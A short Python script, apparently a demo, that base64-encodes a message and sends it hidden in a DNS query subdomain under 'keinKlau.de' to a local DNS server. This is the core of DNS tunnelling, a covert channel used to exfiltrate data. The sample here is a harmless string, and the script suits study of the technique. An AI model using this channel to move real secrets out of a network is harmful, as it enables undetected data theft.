import dns.message
import dns.query
import dns.name
import base64


def send_hidden_message(dns_server, hidden_message):

    encoded_message = base64.urlsafe_b64encode(hidden_message.encode()).decode()

    query_name = f"{encoded_message}.keinKlau.de"
    #query_name = f"{hidden_message}.keinKlau.de"
    query = dns.message.make_query(query_name, dns.rdatatype.A)

    try:
        response = dns.query.udp(query, dns_server)
        print("DNS-Anfrage gesendet. Antwort erhalten:")
        print(response)
    except Exception as e:
        print(f"Fehler beim Senden der DNS-Anfrage: {e}")


if __name__ == "__main__":
    dns_server = "127.0.0.1"
    hidden_message = "Geheime Nachricht"
    send_hidden_message(dns_server, hidden_message)
